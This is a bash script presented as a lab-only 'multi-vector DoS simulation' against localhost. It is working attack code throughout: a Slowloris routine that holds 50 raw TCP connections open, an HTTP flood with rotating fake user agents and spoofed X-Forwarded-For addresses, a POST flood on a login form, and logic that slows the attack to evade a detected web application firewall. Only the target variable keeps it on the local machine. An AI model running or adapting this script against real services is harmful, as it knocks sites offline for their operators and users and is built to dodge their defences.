#!/bin/bash
# Multi-vector DoS simulation script (Lab use only)
TARGET="http://127.0.0.1"
PORT=80
MAX_CONNECTIONS=100
FAKE_USER_AGENTS=("curl" "Mozilla/5.0" "Python-urllib" "wget" "Go-http-client" "Java/1.8.0")

echo "[*] Detecting firewall protection..."
# Very basic detection (not real bypass, just behavior-based)
WAF_CHECK=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET")

if [[ "$WAF_CHECK" == "403" || "$WAF_CHECK" == "406" ]]; then
  echo "[!] WAF Detected! Switching to stealth mode."
  DELAY=0.5
else
  echo "[*] No WAF detected. Going full power!"
  DELAY=0.1
fi

generate_ip() {
  echo "$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"
}

slowloris_attack() {
  for i in $(seq 1 50); do
    {
      exec 3<>/dev/tcp/127.0.0.1/80
      echo -e "GET / HTTP/1.1\r\nHost: localhost\r\n" >&3
      while true; do
        echo -e "X-a: keep-alive\r\n" >&3
        sleep 10
      done
    } &
  done
}

echo "[*] Starting Slowloris (50 connections)..."
slowloris_attack

echo "[*] Starting mixed HTTP flood with fake IP headers..."
for i in $(seq 1 $MAX_CONNECTIONS); do
  FAKE_IP=$(generate_ip)
  UA=${FAKE_USER_AGENTS[$RANDOM % ${#FAKE_USER_AGENTS[@]}]}
  curl -s -A "$UA" -H "X-Forwarded-For: $FAKE_IP" "$TARGET" > /dev/null &
  sleep $DELAY
done

echo "[*] Starting login form brute flood..."
for i in {1..50}; do
  curl -s -X POST -d "username=admin&password=wrongpass" "$TARGET/login" > /dev/null &
done

wait
echo "[*] Attack simulation finished."
